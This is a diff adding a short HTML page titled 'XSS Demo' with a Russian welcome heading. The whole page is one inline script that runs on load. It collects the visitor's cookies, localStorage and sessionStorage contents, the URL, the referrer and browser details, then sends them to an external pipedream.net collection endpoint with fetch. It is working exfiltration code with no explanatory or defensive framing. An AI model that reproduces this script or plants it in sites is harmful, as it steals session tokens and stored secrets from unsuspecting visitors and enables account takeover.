@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>XSS Demo</title>
+  </head>
+  <body>
+    <h1>Добро пожаловать</h1>
+    <script>
+      (async () => {
+        const data = {
+          cookie: document.cookie,
+          location: location.href,
+          referrer: document.referrer,
+          userAgent: navigator.userAgent,
+          screen: {
+            width: screen.width,
+            height: screen.height
+          },
+          localStorage: JSON.stringify(localStorage),
+          sessionStorage: JSON.stringify(sessionStorage),
+          timestamp: new Date().toISOString()
+        };
+
+        const query = encodeURIComponent(JSON.stringify(data));
+
+        await fetch('https://eo4n48r42eh7pd8.m.pipedream.net/?data=' + query);
+      })();
+    </script>
+  </body>
+</html>
